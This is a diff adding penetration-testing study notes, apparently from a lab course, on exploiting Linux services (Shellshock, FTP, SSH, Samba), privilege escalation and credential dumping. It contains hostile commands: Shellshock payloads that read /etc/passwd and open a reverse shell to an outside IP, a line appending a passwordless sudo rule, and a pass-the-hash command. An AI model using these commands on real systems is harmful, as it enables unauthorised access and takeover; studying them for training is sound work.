@@ -205,3 +205,74 @@ Windows Credential Dumping
     - Psexec, crackmapexec are tools that can facilitate pass-the-hash
         - SMBPass can be the LM:NTLM hash
     - crackmapexec smb <ip> -u Administrator -H "<NTLM>" -x "<command>"
+
+Linux Vulnerabilities
+
+- Frequently exploited Linux services
+    - Linux kernel + GNU toolkit = GNU/Linux
+    - Services:
+        - Apache Web server: TCP port 80 or 443
+        - SSH: TCP port 22
+        - FTP: TCP port 21
+        - SAMBA: TCP port 445
+
+- Exploiting Shellshock
+    - CVE-2014-6271
+    - Vulnerability in the Bash shell
+    - Bash is the default shell for most Linux distributions
+    - Apache web servers configured to run CGI (Common Gateway Interface) or .sh scripts are vulnerable
+    - CGI are used by Apache to execute arbitrary commands after which the output is displayed to the client
+    - nmap -sV <ip> --script=http-shellshock --script-args "http-shellshock.uri=/<cgi script>"
+    - Replace User-Agent with: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
+    - () { :; }; echo; echo; /bin/bash -c 'bash -i >&/dev/tcp/192.161.118.2/1234 0>&1'
+
+- Exploiting FTP
+    - TCP port 21
+    - Anonymous access is often misconfigured
+
+- Exploiting SSH
+    - TCP port 22
+    - Telnet + Encryption basically
+    - Username & password, key authenticattion
+
+- Exploiting SAMBA
+    - Open source linux SMB implementation
+    - TCP port 445 or 139 (on top of NetBIOS)
+    - smbmap can be used to enumerate shares, files...
+    - smbclient can be used to connect to the shares
+    - enum4linux can be used to enumerate shares, files...
+
+Linux Privilege escalation
+
+- Linux Kernel exploits
+    - Two phases
+        1. Identify kernel vulnerabilites
+        2. Download, compile and transfer kernel exploits
+    - Tools:
+        1. Linux-Exploit-Suggester (https://github.com/The-Z-Labs/linux-exploit-suggester)
+
+- Exploiting misconfigured Cron Jobs
+    - Task scheduling is implemented in Linux via Cron
+    - Cron is a time-based service that runs applications, scripts and other commands repeatedly on schedule
+    - Cron jobs can also be run as any user on the system
+    - We want to target cronjobs ran by "root"
+    - echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers
+
+- Exploiting SUID binaries
+    - SUID provides the ability to execute a script or binary with the permissions of the file owner
+    - Two factors:
+        1. Owner of the SUID binary (root preferably)
+        2. Access permissions (require executable permissions)
+    - cp /bin/bash greetings
+
+Linux Credential Dumping
+
+- Dumping Linux Password hashes
+    - /etc/passwd has the information on all the users
+    - /etc/shadow has the encrypted passwords 
+        - $1 MD5
+        - $2 Blowfish
+        - $5 SHA-256
+        - $6 SHA-512
+    - MSF hashdump
+    - Upgrade shell to meterpreter --> sessions -u 
